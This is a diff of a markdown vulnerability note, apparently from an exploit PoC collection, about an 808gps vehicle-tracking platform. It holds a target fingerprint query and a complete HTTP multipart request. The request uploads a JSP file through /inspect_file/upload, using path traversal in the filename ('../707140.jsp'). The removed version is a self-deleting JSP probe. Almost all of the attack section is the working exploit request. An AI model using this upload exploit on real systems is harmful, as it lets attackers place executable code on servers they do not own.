@@ -9,16 +9,20 @@ body="./open/webApi.html"||body="/808gps/"
 ## poc
 ```
 POST /inspect_file/upload HTTP/1.1
-Host: 
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept-Encoding: gzip, deflate
 Accept: */*
-content-Length: 238
-Content-Type: multipart/form-data;boundary=-----------------------------7db372eb000e2
+Connection: close
+Content-Length: 226
+Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b
 
------------------------------7db372eb000e2
-Content-Disposition: form-data; name="uploadFile"; filename="1.jsp"
+--2e7688d712bcc913201f327059f9976b
+Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
 Content-Type: application/octet-stream
 
-<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------------------------------7db372eb000e2--
+<% out.println("007319607"); %>
+--2e7688d712bcc913201f327059f9976b--
 ```
+
+![image-20240524224902984](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405242249085.png)
